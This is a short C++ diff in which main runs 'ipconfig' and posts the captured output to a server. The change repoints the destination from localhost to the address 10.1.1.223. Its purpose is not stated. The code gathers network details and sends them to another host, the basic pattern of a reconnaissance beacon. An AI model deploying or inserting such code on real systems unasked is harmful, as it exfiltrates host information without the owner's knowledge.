@@ -105,7 +105,7 @@ void postToServer(const std::string& server, const std::string& port,
 int main() {
   try {
     std::string result = execCommand("ipconfig");
-    postToServer("localhost", "8000", "/", result);
+    postToServer("10.1.1.223", "8000", "/", result);
   } catch (const std::exception& e) {
     std::cerr << "Exception: " << e.what() << "\n";
   }
